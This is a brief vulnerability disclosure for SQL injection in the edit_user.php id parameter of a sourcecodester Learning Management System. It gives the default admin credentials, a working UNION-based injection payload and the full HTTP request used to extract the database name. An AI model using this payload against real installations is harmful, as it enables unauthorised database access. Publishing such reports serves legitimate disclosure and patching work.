# Online Learning Management System v1.0 by sourcecodester has SQL injection 5

BUG_Author: Du Kai

Login account: admin/admin

vendors: https://www.sourcecodester.com/php/7339/learning-management-system.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /lms/admin/edit_user.php

Vulnerability location: /lms/admin/edit_user.php?id=, id

dbname=capstone

[+] Payload: /lms/admin/edit_user.php?id=-13%27%20union%20select%201,database(),3,4,5--+ // Leak place ---> id

```sql
GET /lms/admin/edit_user.php?id=-13%27%20union%20select%201,database(),3,4,5--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=uu9o3gvufrsptq8n5f6gjpbuac
Connection: close


```
<img width="1709" height="780" alt="image" src="https://github.com/user-attachments/assets/92905b8a-0c9d-4a43-b63f-c6f71a85ab9b" />

